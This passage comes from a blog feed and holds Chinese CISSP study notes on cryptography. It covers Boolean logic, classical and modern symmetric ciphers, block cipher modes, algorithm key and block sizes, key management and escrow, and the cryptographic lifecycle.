mathermatics）</h4><p>为用于构成任何计算机神经系统的位和字节定义了规则。</p><p>一般来说，计算机科学家把“开”状态称作真（true）值，把“关”状态称作假（false）值</p><p>0 &#x3D; FLASE</p><p>1 &#x3D; TRUE</p><h4 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h4><p>密码学涉及的布尔数学利用各种逻辑函数来操控数据。</p><h5 id="AND（与）"><a href="#AND（与）" class="headerlink" title="AND（与）"></a>AND（与）</h5><p>“AND”运算（用符号“^”表示）检查两个值是否都真</p><p>比较两个变量每列中的值，当列中的值都为真时，输出值才为真</p><h5 id="OR（或）"><a href="#OR（或）" class="headerlink" title="OR（或）"></a>OR（或）</h5><p>“OR” 运算（用符号“v”表示）检查输入值中是否至少有一个为真</p><p>注意：</p><p>只有当两个值都为假时，OR 函数才返回一个假值</p><h5 id="NOT（非）"><a href="#NOT（非）" class="headerlink" title="NOT（非）"></a>NOT（非）</h5><p>“NOT”运算（用符号“~”表示），颠倒一个输入变量的值，也就是真变为假，假变为真。</p><p>注意：</p><p>NOT函数一次只在一个变量上运算。</p><h5 id="Exclusive-OR（异或）"><a href="#Exclusive-OR（异或）" class="headerlink" title="Exclusive OR（异或）"></a>Exclusive OR（异或）</h5><p>密码学中最重要和最常用的逻辑函数。</p><p>数学中将异或写成 XOR 函数，通常用符号 ⊕ 表示。</p><p>只有当一个输入值为真的时候，XOR 函数才返回一个真值。</p><p>两个值都为假或两个值都为真的时候，XOR 函数返回假值。</p><h4 id="模函数"><a href="#模函数" class="headerlink" title="模函数"></a>模函数</h4><p>模（modulo）函数在密码学领域极其重要。</p><p>模函数是一次除法运算之后留下的余数。</p><p>在等式中用缩写 “mod” 表示，或者用运算符“%”表示</p><h4 id="单向函数"><a href="#单向函数" class="headerlink" title="单向函数"></a>单向函数</h4><p>单向函数（one-way function）</p><p>是能方便地为输入的每种可能组合生成输出值的一种数学运算，但是这一运算会导致无法恢复输入值。</p><p>公钥密码系统全都建立在某种单向函数的基础之上。</p><p>但是实践从来没有证明，任何具体的已知单向函数确实是单向的，也就是说单向函数被破解的可能性在未来始终存在。</p><h4 id="nonce"><a href="#nonce" class="headerlink" title="nonce"></a>nonce</h4><p>密码常通过给加密过程添加随机性来获得强度。</p><p>使用nonce就是实现密码随机性的方法之一，nonce是一个随机数，可在数学函数中充当占位符变量，每次函数执行，nonce都会被一个在开始处理时生成的一次性随机数替换。</p><p>nonce每次被使用时都必须时一个唯一的数。</p><h5 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h5><p>零知识证明出现的情况：</p><p>一个人想要证明自己知道一个事实（如口令或密钥），但又不想把这个事实向另外一个人公开。可以通过复杂的数学运算实现，如离散对数和图论。</p><h5 id="分割知识"><a href="#分割知识" class="headerlink" title="分割知识"></a>分割知识</h5><p>职责分离和双人控制融于一个解决方案的做法叫分割知识（split knowledge）。例如：当执行某种操作所要求的信息或权限被分散到多名用户手中时，任何一个人都不会具有足够的权限来破坏环境的安全。</p><p>分割知识最佳案例：密钥托管（key escrow）概念。</p><p>采用密钥托管后，密码密钥会被交给一个第三方妥善保存。当满足某些条件时，第三方可以用托管密钥来恢复授权用户的访问权限或自行解密资料。这个第三方叫恢复代理（recovery agent）。</p><p>密钥托管方案中，单一恢复代理存在着欺诈和滥用权限的机会。</p><p><strong>N之取M控制</strong>（M of N Control）要求代理总数（N）中至少有M个代理同时在场才能执行高安全级别任务，M总是小于或等于N。</p><h5 id="代价函数"><a href="#代价函数" class="headerlink" title="代价函数"></a>代价函数</h5><p>用代价函数（work function）或代价因子从耗费成本和&#x2F;或时间的角度测算破解一个密码系统时需要付出的努力，从而衡量密码系统的强度。</p><p>密码系统提供的安全和保护与代价函数&#x2F;因子的值呈正比例关系，也就是说，包括密码保护在内的所有安全措施都应该是有成本效益和成本效率的。</p><p>密码系统挑选需要了解数据具有价值的时间长度、需要了解新涌现的技术可能对破解密码的努力产生什么影响。</p><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><h4 id="代码与密码"><a href="#代码与密码" class="headerlink" title="代码与密码"></a>代码与密码</h4><p><strong>代码</strong> code：由代表单词和短语的符号够成的密码系统。尽管代码有时候时保密的，但它们并不一定提供保密性保护。例如：莫尔斯电码、旗语</p><p><strong>密码</strong> cipher：始终要隐藏消息的真实含义。</p><p>密码通过各种技术手段更改和&#x2F;或重新排列消息的字符或位，以实现保密性。</p><p>密码以位（即一个个位二进制代码）、字符（即ASCII消息的单个字符）或块（即消息的一个固定片段，通常以位数表示）为单位将消息从明文变成密文。</p><p><strong>代码和密码的区别</strong></p><p>代码作用于单词和短语</p><p>密码作用于字符、位和块</p><h4 id="移位密码"><a href="#移位密码" class="headerlink" title="移位密码"></a>移位密码</h4><p>移位密码（transposition cipher ）通过一种加密算法重新排列明文消息的字母，形成密文消息。解密算法只需要逆向执行加密位移便可恢复原始消息。</p><h4 id="替换密码"><a href="#替换密码" class="headerlink" title="替换密码"></a>替换密码</h4><p>替换密码（substitution cipher）通过加密算法用一个不同的字符替换明文消息的每个字符或位。</p><p>常见替换密码：单表替换（凯撒密码）、多表替换（Vigenere密码）</p><h5 id="单表替换（凯撒密码）"><a href="#单表替换（凯撒密码）" class="headerlink" title="单表替换（凯撒密码）"></a>单表替换（凯撒密码）</h5><p>凯撒密码（Caesar cipher）也被称为 ROT3（或Rotate 3，轮转 3），也就是将字母表上的每个字母向右移 3 位。</p><p>注意：凯撒密码采用的是 3 字母移位，在实际使用过程中，可根据使用者需求，用相同的算法移位任意数量的字母，例如，ROT 12，向右移动 12 位。</p><p>警告：凯撒密码易于使用，也易于破解。频率分析（frequency analysis）攻击进行破解。由于英语语言中使用最频繁的字母是 E、T、A、O、N、R、I、S 和 H，攻击者在被加密的文本中找出最常用的字母，然后尝试替换这些常用字母，便可实现对使用凯撒密码加密的英文消息破解。</p><p>凯撒密码的加密函数：</p><p>C &#x3D; (P + 3) mod 26</p><p>凯撒密码的解密函数：</p><p>P &#x3D; （C - 3）mod 26</p><h5 id="多表替换（Vigenere密码）"><a href="#多表替换（Vigenere密码）" class="headerlink" title="多表替换（Vigenere密码）"></a>多表替换（Vigenere密码）</h5><p>多表替换密码在同一条消息中使用多个字母表。</p><p>多表替换密码系统的著名案例是 Vigenere 密码系统 。</p><p>多表替换可以抵御直接频率分析，但是无法抵御周期分析（period analysis）的二阶式频率分析攻击，也就是根据密钥的重复使用情况进行频率分析。</p><h4 id="单次密本-Vernam密码"><a href="#单次密本-Vernam密码" class="headerlink" title="单次密本 Vernam密码"></a>单次密本 Vernam密码</h4><p>单次密本（one-time pad）是及其强力的一种替换密码。</p><p>单次密本为明文消息中的每个字母使用一个不同的替换字母表。</p><p>加密函数表示：</p><p>K是用于将明文字母P加密成密文字母C的加密密钥</p><p>C &#x3D; （P + K）mod 26</p><p><strong>单次密本优势</strong>：</p><p>如果使用得当，将是不可破解的</p><p><strong>保证算法完整性要求：</strong></p><p>1、<strong>单次密本必须随机生成</strong>。若使用从一本书中摘取的短语或段落，使得密码分析者有机会破解。</p><p>2、<strong>单次密本必须处于物理保护之下，以防泄露</strong>。敌人如果拿到密本拷贝，即可轻易破解加密消息。</p><p><strong>凯撒密码、Vigenere密码和单次密本相似度</strong></p><p>三者唯一区别是密钥长度不同，凯撒密码密钥长度为 1，Vigenere密码使用的密钥长一些（通常是一个词或一句话），单次密本使用的密钥和消息本身一样长。</p><p>3、<strong>每个单次密本必须只使用一次</strong>。如果重复使用密本，存在密码分析者通过对使用同一密本加密消息的比较分析出密钥值的可能性。</p><p>常见做法为使用完密钥后将密本销毁，避免重复使用。</p><p>4、密钥必须至少与将被加密的消息一样长。</p><p><strong>单次密本未推广使用原因</strong></p><p>难以生成、分发和保护所要求的冗长密钥。</p><p>单次密本只能用于较短的消息。</p><h4 id="运动密钥密码"><a href="#运动密钥密码" class="headerlink" title="运动密钥密码"></a>运动密钥密码</h4><p>使用运动密钥密码的原因：密码密钥长度有限，存在密码漏洞；单次密本需要物理交换密本，非常棘手。</p><p>运动密钥密码（running key cipher），也叫书密码（book cipher）。</p><p>运动密钥密码特点：</p><p>加密密钥与消息本身一样长</p><p>选自一部普通图书、一张报纸或一本杂志</p><h4 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h4><p>块密码（block cipher）在消息“块”上运算，在同一时间对整个消息执行加密算法。</p><p>移位算法是块密码的例子。</p><p>挑战-应答算法使用的简单算法提取整个词，然后反向排列词的字母。</p><h4 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h4><p>流密码（stream cipher）一次在消息（或消息流）的一个字符或一个位上运行。</p><p>凯撒密码是流密码的一个例子。</p><p>单次密本也是一种流密码。</p><p>流密码也可发挥某种类型块密码的作用。</p><h4 id="混淆和扩散"><a href="#混淆和扩散" class="headerlink" title="混淆和扩散"></a>混淆和扩散</h4><p>密码算法依靠两种基本运算-混淆（confusion）和扩散（diffusion）来隐藏明文信息。</p><p><strong>混淆运算</strong>：明文和密钥之间有着极复杂的关系，以至于攻击者不能只靠改动明文和分析结果密文来确定密钥。例如：替换。</p><p>扩散运算：明文中发生的一点变化会导致多个变化在整个密文中传播。例如：移位。</p><h2 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h2><p>现代密码系统通过<strong>复杂算法</strong>（在计算上和复杂的算法）和<strong>长密码密钥</strong>来实现密码学的<strong>保密性</strong>、<strong>完整性</strong>、<strong>身份认证</strong>和<strong>不可否认性</strong>目标。</p><h3 id="密码密钥"><a href="#密码密钥" class="headerlink" title="密码密钥"></a>密码密钥</h3><p>早期密码学依赖算法保密确保安全。</p><p>现代密码学依靠一个或多个密码密钥的保密性，而这些密钥将用于为特定用户或用户群体个性化定制算法。</p><p>密钥的长度与密码系统的代价函数直接相关：密钥越长，密码系统就越难被破解。</p><p>密钥管理实践规范：</p><p>1、长密钥</p><p>2、在预期的信息保密时间内保持密钥安全</p><p>3、始终安全地存储密钥，例如网络传输需要采取适当的方式确保安全性</p><p>4、尽可能以随机性高的方法选择密钥，充分利用整个密钥空间</p><p>5、当密钥不再被需要时，安全地将它们销毁</p><h3 id="对称密钥算法"><a href="#对称密钥算法" class="headerlink" title="对称密钥算法"></a>对称密钥算法</h3><p>对称密钥算法依靠一个分发给所有通信参与者的“共享秘密”加密密钥。</p><p>对称密钥加密法也叫秘密密钥密码（secret key cryptography）和私钥密码（private key cryptography）</p><p>当使用的密钥极大时，对称加密会变得非常难以破解，常用于进行海量加密，只提供保密性安全服务。</p><p>对称密钥会与只用于一次会话的短暂密钥一起使用，这种情况下使用的密钥被称为临时密钥（ephemeral key），最常见的例子是传输层安全（TLS）协议，用非对称密码建立一条加密信道，然后切换到使用临时密钥的对称密码。</p><p><strong>对称密钥加密法劣势</strong>：</p><p><strong>1、密钥分发是主要问题</strong>。使用之前需要找到一种安全的方式交换秘密密钥。如果没有现成的安全电子信道使用，需要采用一种安全的线下分发方法（即带外交换）。</p><p>2、对称密钥加密法不提供不可否认性。</p><p>3、算法缺乏可扩展性。</p><p>4、密钥必须经常重新生成。</p><p>每当有参与者离开通信群体时，该参与者知道的所有密钥都必须弃用。</p><p><strong>对称密钥加密法优势：</strong></p><p>1、运算速度非常快，往往比非对称加密算法快1000到10000倍。</p><p><strong>从数学的属性看使用场景</strong>：</p><p>对称加密更适合硬件执行，从而为更高速的运算创造机会</p><h3 id="非对称密钥算法"><a href="#非对称密钥算法" class="headerlink" title="非对称密钥算法"></a>非对称密钥算法</h3><p>非对称密钥算法（asymmetric key algorithm）可提供解决方案以消弭对称密钥加密的弱点。</p><p>公钥算法（public key algorithm）是非对称算法中最常用的例子。</p><p>非对称密钥系统中，每个用户都有两个密钥：一个是所有用户共享的公钥，另一个是只有用户自己知道并保守秘密的私钥。</p><p>非对称密钥算法的复杂性：公钥加密的消息，只有对应的私钥才可以解开。</p><p><strong>非对称密钥算法优势</strong>：</p><p>1、添加新用户时只需要生成一个公钥-私钥对，即可扩展性极高。</p><p>2、只需要在用户私钥失信的情况下重新生成密钥。</p><p>3、非对称密钥加密可提供完整性、身份认证和不可否认性。</p><p>4、密钥分发简便易行。对外只需要提供公钥。</p><p>5、不需要预先建立通信关联。</p><p><strong>非对称密钥算法劣势</strong>：</p><p>运算速度缓慢</p><p>针对这一原因，许多需要安全传输大量数据的应用先用公钥密码建立连接，以此交换一个对称秘密密钥，然后安排剩余的会话使用对称密钥加密法。这种既使用对称密钥，也适用非对称密钥的方法叫做混合密码（hybrid cryptography）。</p><p><strong>非对称密钥算法适用场景</strong>：</p><p>1、加密传输：公钥加密，私钥解密</p><p>2、数字签名技术：私钥加密，公钥解密</p><p>对称和非对称密码系统比较</p><table><thead><tr><th>对称</th><th>非对称</th></tr></thead><tbody><tr><td>单个共享密钥</td><td>密钥对集</td></tr><tr><td>带外交换</td><td>带内交换</td></tr><tr><td>不可扩展</td><td>可扩展</td></tr><tr><td>速度快</td><td>速度慢</td></tr><tr><td>大批量加密</td><td>小块数据、数字签名、数字封装、数字证书</td></tr><tr><td>保密性</td><td>保密性、完整性、身份认证、不可否认性（数字签名）</td></tr></tbody></table><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><p>消息摘要（也叫哈希值或指纹）是有哈希算法生成的消息内容归纳（与文件校验没什么不同）。</p><p>一个哈希函数为两种不同方法产生相同值的情况被称为碰撞（collision），而碰撞的存在通常会导致哈希算法贬值。</p><p>公钥密码系统与消息摘要配套使用可提供数字签名能力，从而实现密码的完整性和不可否认性目标。</p><h2 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h2><h3 id="密码运行模式"><a href="#密码运行模式" class="headerlink" title="密码运行模式"></a>密码运行模式</h3><p>密码的运行模式是指密码为实现抵御攻击的充分复杂度而采用的转换数据的不同方式。</p><p>密码的主要运行模式：</p><p>电子密码本（ECB）模式</p><p>密码块链接（CBC）模式</p><p>密码反馈（CFB）模式</p><p>输出反馈（OFB）模式</p><p>计数器（CTR）模式</p><p>Galois&#x2F;计数器（GCM）模式</p><p>带密码块链接消息验证码的计数器（CCM）模式</p><h4 id="电子密码本模式"><a href="#电子密码本模式" class="headerlink" title="电子密码本模式"></a>电子密码本模式</h4><p>电子密码本（Electronic Code Book，ECB）模式是最容易理解的简单模式，也是最不安全的模式。</p><p>算法每次处理一个64位块，只用选好的秘密密钥给块加密。</p><p>算法如果多次遇到同一个块，将会生成相同的加密块，存在利用密码分析破解加密方案的风险。</p><p>ECB模式只用来交换少量数据，例如用于启动其他密码模式的密钥和参数以及数据库的计算单元。</p><h4 id="密码块链接模式"><a href="#密码块链接模式" class="headerlink" title="密码块链接模式"></a>密码块链接模式</h4><p>在密码块链接（Cipher Block Chaining，CBC）模式中，每块未加密文本在被加密之前，都要先借助前面刚生成的密文块接受异或（XOR）运算。</p><p>解密流程只需要解密密文并进行反向异或运算。</p><p>CBC模式缺陷：错误传输的问题，如果一个块在传输过程中被破坏，那么这个块以及后面的块将无法解密。</p><h4 id="密码反馈模式"><a href="#密码反馈模式" class="headerlink" title="密码反馈模式"></a>密码反馈模式</h4><p>密码反馈（Cipher Feedback，CFB）模式是CBC模式的流密码版。换句话说，CFB针对实时生成的数据进行运算。</p><p>CFB模式不把消息分成块，而是使用与块大小相同的存储缓冲区。在缓冲区被填满时给数据加密，然后发送密文给接收者。</p><p>CFB使用实时数据，而不是原先就有的数据。</p><p>CFB和CBC采用的方式相同，都是使用一个IV，并且使用了链接。</p><h4 id="输出反馈模式"><a href="#输出反馈模式" class="headerlink" title="输出反馈模式"></a>输出反馈模式</h4><p>输出反馈（Output Feedback，OFB）模式，密码以与CFB模式几乎完全相同的方式运行。</p><p>与CFB的区别在于：</p><p>OFB不是对前一个密文块的加密版进行异或运算，而是用一个种子值对明文进行异或。对于第一个被加密的块，OFB使用一个初始向量来创建种子值，后面的种子值则通过算法在前一个种子值的基础上运算得出。</p><p>OFB的优势：</p><p>不存在链接函数，传输错误不会传播，因而不会影响后面块的解密。</p><h4 id="计数器模式"><a href="#计数器模式" class="headerlink" title="计数器模式"></a>计数器模式</h4><p>计数器（Counter，CTR）模式使用了与CFB和OFB模式类似的流密码。</p><p>CTR的种子值不是在前一个种子值的基础上得来，而是利用一个简单的计数器为每次运算增量。</p><p>CTR的优势：</p><p>不存在链接函数，传输错误不会传播，因而不会影响后面块的解密。</p><h4 id="Galois-计数器模式"><a href="#Galois-计数器模式" class="headerlink" title="Galois&#x2F;计数器模式"></a>Galois&#x2F;计数器模式</h4><p>Galois&#x2F;计数器模式（Galois&#x2F;Counter Mode，GCM）采用标准CTR加密模式，并添加了数据真实性控制，可确保接收方所接收数据的完整性。这一点是通过向加密过程添加身份认证标记（authentication tag）来实现的。</p><h4 id="带密码块链接消息验证码的计数器模式"><a href="#带密码块链接消息验证码的计数器模式" class="headerlink" title="带密码块链接消息验证码的计数器模式"></a>带密码块链接消息验证码的计数器模式</h4><p>与GCM类似，带密码块链接消息验证码的计数器模式（CCM）把保密性模式与数据真实性流程结合在一起。</p><p>CCM密码把用于保证保密性的计数器（CTR）模式与用于保证数据真实性的块密码链接消息验证码（CBC-MAC）算法融为一体。</p><p>CCM只用于具有128位块长度并要求每次传输使用不同nonce的块密码。</p><p><strong>GCM和CCM，都包含了保密性和数据真实性，因此被称为经过验证的加密模式。</strong></p><p><strong>ECB、CBC、CFB、OFB、CTR模式只提供保密性，因此被称为未经验证的加密模式。</strong></p><h3 id="数据加密标准"><a href="#数据加密标准" class="headerlink" title="数据加密标准"></a>数据加密标准</h3><p>DES是一种64位块密码，共有5种运行模式：电子密码本（ECB）模式、密码块链接（CBC）模式、密码反馈（CFB）模式、输出反馈（OFB）模式和计数器（CTR）模式。</p><p>DES所有模式都是一次性在64位明文上进行运算，以生成64位密文块。</p><p>DES使用的密钥长度为56位。</p><p>DES通过长长的一系列异或（XOR）运算生成密文。这个过程会为每个加密&#x2F;解密操作重复16遍，每次重复通常称为一轮加密，因此有DES需要执行16轮加密的说法，每轮加密都生成一个新密钥，新密钥将被用作随后加密轮次的输入。</p><h3 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h3><p>3DES有多个不同变体，每个变体都使用了不同数量的独立密钥。</p><p>头两个变体DES-EDE3和DES-EEE3使用了3个不同的独立密钥：K1、K2、K3。</p><p>DES-EDE3和DES-EEE3的区别：</p><p>执行的运算不同，字母E代表加密，D代表解密</p><p>EDE3用K1给数据加密，用K2解密得出的密文，然后用K3加密文本。可以用如下表达式表示，其中E(K,P)代表用密钥K给明文P加密，D(K,P)代表用密钥K给密文C解密：E(K1,D(K2,E(K3,P)))</p><p>EEE3用所有的3个密钥依次给数据加密，可表示为：E(K1,E(K2,E(K3,P)))</p><p>从数学角度上讲，DES-EDE3和DES-EEE3应该具有168位有效密钥长度，但是由于已知的攻击把算法的有效强度降为了112位。</p><h3 id="国际数据加密算法"><a href="#国际数据加密算法" class="headerlink" title="国际数据加密算法"></a>国际数据加密算法</h3><p>“国际加密算法”（IDEA）块密码在64位明文&#x2F;密文块上运行，不过，IDEA是用一个128位密钥开始运算的，该密钥在一系列运算中被分解为52个16位子密钥。子密钥随后通过异或与模运算的结合作用到输入文本上，以产生输入消息的加密&#x2F;解密版。</p><p>IDEA能在DES使用的5中模式（ECB、CBC、CFB、OFB、CTR）下运行。</p><h3 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h3><p>Bruce Schneier 的 Blowfish 块密码是 DES 和IDEA的另一个替换方案。</p><p>Blowfish 在64位文本块上运行，但是Blowfish允许密钥长度变化（其中最短为相对不太安全的32位，最长为极强的448位），从而进一步扩展了IDEA的密钥强度。</p><p>正常情况下，密钥的加长会导致加密&#x2F;解密时间的相应增加。但时间实验证明，Blowfish这种算法比IDEA和DES的速度要快很多。同时Schneier对公众开放Blowfish，使用它不需要任何许可证。</p><h3 id="Skipjack"><a href="#Skipjack" class="headerlink" title="Skipjack"></a>Skipjack</h3><p>Skipjack 算法被美国政府在联邦信息处理表中（FIPS）185“托管加密标准”（EES）中批准使用。</p><p>Skipjack在64位文本块上运行，使用 80 位密钥，支持 DES支持的四种运行模式。</p><p>Skipjack 支持机密密钥托管。美国NIST和财政部各持有重建 Skipjack 密钥所需信息的一部分。</p><h3 id="Rivest-Ciphers"><a href="#Rivest-Ciphers" class="headerlink" title="Rivest Ciphers"></a>Rivest Ciphers</h3><p>Rivest-Shamir-Adleman（RSA）Data Security 公司的 Ron Rivest 创建了一系列对称密码，业界称为 Rivest Cipher（RC）算法家族。</p><p>RC4、RC5、RC6在当今发挥了特别重要的作用</p><h4 id="Rivest-Ciphers-4（RC4）"><a href="#Rivest-Ciphers-4（RC4）" class="headerlink" title="Rivest Ciphers 4（RC4）"></a>Rivest Ciphers 4（RC4）</h4><p>1987年开发的一种流密码。</p><p>只进行一轮加密，运行使用40-2048位的长度可变密钥。</p><p>被集成到有线等效隐私（WEP）、Wi-Fi保护防护（WPA）、安全套接字层（SSL）和传输层安全（TLS）等协议中。</p><p>RC4遭到一系列攻击导致不安全，也就是WEP、SSL、WPA不再符合现代安全标准，而TLS也不再允许把RC4用作流密码。</p><h4 id="Rivest-Ciphers-5（RC5）"><a href="#Rivest-Ciphers-5（RC5）" class="headerlink" title="Rivest Ciphers 5（RC5）"></a>Rivest Ciphers 5（RC5）</h4><p>RC 5 是一种块大小可变（32、64和128位）的块密码，所用密钥大小为 0-2040 位。</p><p>RC 5 与 RC 4 无关，是 RC 2 的改进版。</p><p>RC 5 承担暴力破解实验，64位密钥RC5加密的消息，需要 4 年多时间才破解。</p><h4 id="Rivest-Ciphers-6（RC6）"><a href="#Rivest-Ciphers-6（RC6）" class="headerlink" title="Rivest Ciphers 6（RC6）"></a>Rivest Ciphers 6（RC6）</h4><p>RC6 是作为 RC5 下一个版本而开发的一种块密码。</p><p>RC6 采用 128 位块大小，允许使用 128、192和256位对称密码。</p><h3 id="高级加密标准"><a href="#高级加密标准" class="headerlink" title="高级加密标准"></a>高级加密标准</h3><p>2000年，美国国家标准与技术研究院（NIST）宣布，Rijndael块密码被选中用来代替 DES。</p><p>高级机密标准 AES 密码允许使用 3 种密钥强度：128、192和256位。</p><p>AES 只允许处理 128 位块，但Rijndael超出了该规定，运行密码学家使用与密钥长度相等的块大小。</p><p>加密的轮数取决于所选密钥的长度</p><p>128位密钥要求 10 轮加密。</p><p>192位密钥要求 12 轮加密。</p><p>256位密钥要求 14 轮加密。</p><h3 id="CAST"><a href="#CAST" class="headerlink" title="CAST"></a>CAST</h3><p>CAST 算法被集成进一些安全解决方案的对称密钥块密码家族。</p><p>CAST 算法使用了 Feistel 网络，有两种表现形式：</p><p>CAST-128 用大小为 40-128 位的密钥对 64 位明文块进行 12-16轮 Feistel 网络加密。</p><p>CAST-256 用大小为 128、160、192、224或256位的密钥对 128 位明文块进行 48 轮加密。</p><h3 id="Twofish"><a href="#Twofish" class="headerlink" title="Twofish"></a>Twofish</h3><p>Bruce Schneier（也是 Blowfish 的创造者）开发的 Twofish 算法是 AES 的另一个终极品。</p><p>与 Rijndael 一样，Twofish 是一种块密码，在 128 位数据块上运行，能够使用长达 256 位的密码密钥。</p><p>Twofish独有的两种算法：</p><p>预白化处理（prewhitening）指第 1 轮加密前用一个单独的子密钥对明文进行异或运算。</p><p>白化后处理（postwhitening）指 16 轮加密后执行同样的运算。</p><h3 id="✨对比各种加密算法"><a href="#✨对比各种加密算法" class="headerlink" title="✨对比各种加密算法"></a>✨对比各种加密算法</h3><table><thead><tr><th>名称</th><th>块大小</th><th>密钥大小</th></tr></thead><tbody><tr><td>高级加密标准（AES）</td><td>128</td><td>128、192、256</td></tr><tr><td>Rijndael</td><td>可变</td><td>128、192、256</td></tr><tr><td>Blowfish（常用于 SSH）</td><td>64</td><td>32-448</td></tr><tr><td>数据加密标准（DES）</td><td>64</td><td>56</td></tr><tr><td>IDEA（用于 PGP）</td><td>64</td><td>128</td></tr><tr><td>Rivest Cipher 4（RC4）</td><td>无（流密码）</td><td>40-2048</td></tr><tr><td>Rivest Cipher 5（RC5）</td><td>32、64、128</td><td>0-2040</td></tr><tr><td>Rivest Cipher 6（RC6）</td><td>128</td><td>128、192、256</td></tr><tr><td>Skipjack</td><td>64</td><td>80</td></tr><tr><td>三重DES（3DES）</td><td>64</td><td>112或168</td></tr><tr><td>CAST-128</td><td>64</td><td>40-128</td></tr><tr><td>CAST-256</td><td>128</td><td>128、160、192、224、256</td></tr><tr><td>Twofish</td><td>128</td><td>1-256</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="对称密钥管理"><a href="#对称密钥管理" class="headerlink" title="对称密钥管理"></a>对称密钥管理</h3><p>密钥管理实践（key management practice）规范，其中包括涉及秘密密钥的创建、分发、存储、销毁、恢复和托管的防护手段。</p><h4 id="创建和分发对称密钥"><a href="#创建和分发对称密钥" class="headerlink" title="创建和分发对称密钥"></a>创建和分发对称密钥</h4><h5 id="安全交换秘密密钥的三种方式"><a href="#安全交换秘密密钥的三种方式" class="headerlink" title="安全交换秘密密钥的三种方式"></a>安全交换秘密密钥的三种方式</h5><h6 id="线下分发"><a href="#线下分发" class="headerlink" title="线下分发"></a>线下分发</h6><p>技术最简单</p><p>存在物理不方便，尤其当处于地理位置遥远的地方</p><p>传输渠道如写有秘密密钥的一张纸（存在被随意丢弃的风险）或装有秘密密钥的一块存储介质（快递过程中存在被拦截风险）</p><h6 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h6><p>公钥加密（非对称加密）建立安全通信连接，交换秘密密钥（对称加密），后续采用秘密密钥（对称加密）进行数据传输。</p><h6 id="Diffie-Hellman密钥交换算法"><a href="#Diffie-Hellman密钥交换算法" class="headerlink" title="Diffie-Hellman密钥交换算法"></a>Diffie-Hellman密钥交换算法</h6><p>线下分发和公钥加密都无法满足需求时，需要使用Diffie-Hellman密钥交换算法。</p><h4 id="存储和销毁对称密钥"><a href="#存储和销毁对称密钥" class="headerlink" title="存储和销毁对称密钥"></a>存储和销毁对称密钥</h4><p>对称加密的重大挑战：必须确保密码系统使用的所有密钥的安全。</p><p>加密密钥存储的最佳实践规范：<br>1、绝不将加密密钥与被加密数据保存在同一个系统里。</p><p>2、对于敏感密钥，考虑安排两人各持一半片段。两人必须同时到场才能重建整个密钥，也就是分割知识原理。</p><p>密钥存储机制选项：</p><p>1、基于软件的存储机制可把密钥作为数字对象保存到使用密钥的系统中</p><p>简便易行，存在引入软件机制遭破坏的风险</p><p>2、基于硬件的存储机制是专用于管理密钥的硬件设备</p><p>也被称为硬件安全模块（hardware security module，HSM）</p><p>更复杂，成本更高，可以提供额外的安全保护</p><h4 id="密钥托管和恢复"><a href="#密钥托管和恢复" class="headerlink" title="密钥托管和恢复"></a>密钥托管和恢复</h4><h5 id="密钥托管"><a href="#密钥托管" class="headerlink" title="密钥托管"></a>密钥托管</h5><p>用于密钥托管的方法：</p><p>1、<strong>公平密码系统</strong> </p><p>通信的秘密被分解成两个或多个片段，每个片段都交由独立的第三方保管，单独的片段不能发挥功效，需要政府获取授权后组合在一起生效。</p><p>2、<strong>托管加密标准</strong></p><p>向政府或另一授权代理提供解密密文的技术手段。</p><p>该方法专门针对Clipper芯片提出的。</p><h5 id="密钥恢复"><a href="#密钥恢复" class="headerlink" title="密钥恢复"></a>密钥恢复</h5><p>密钥恢复代理（recovery agent，RA）能够恢复分配给各个用户的加密密钥。</p><p>背景：</p><p>人员离职、密钥丢失时需要访问加密数据</p><p>控制机制：</p><p>N之取M控制的机制来恢复密钥，N个成员有特权，至少M个成员同意才可以实施。</p><h2 id="密码生命周期"><a href="#密码生命周期" class="headerlink" title="密码生命周期"></a>密码生命周期</h2><p>除了单次密本以外，所有秘密系统的使用寿命都是有限的。</p><p>摩尔定律对计算机能力发展趋势的预测，最先进的微处理器的处理能力大约每两年会提高一倍。</p><p>选择加密算法时，必须重视密码生命周期问题，且必须通过适当的管治控制确保无论需要多长时间内保证受保护的信息不泄密。</p><p>所选择的算法、协议和密钥长度都足以保持密码系统的完整性。</p><p>1、规定机构可接受的密码算法，如AES、3DES和RSA。</p><p>2、根据被传输信息的敏感性识别可与每种算法配套使用的可接受密钥长度。</p><p>3、枚举可用的安全交易协议，如TLS</p><p>密码生命周期的选择需要结合需要保护的内容决定。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yuangekecheng</title>
    <link href="/2024/12/26/security/secstudy/yuangekecheng/"/>
    <url>/2024/12/26/security/secstudy/yuangekecheng/</url>
    
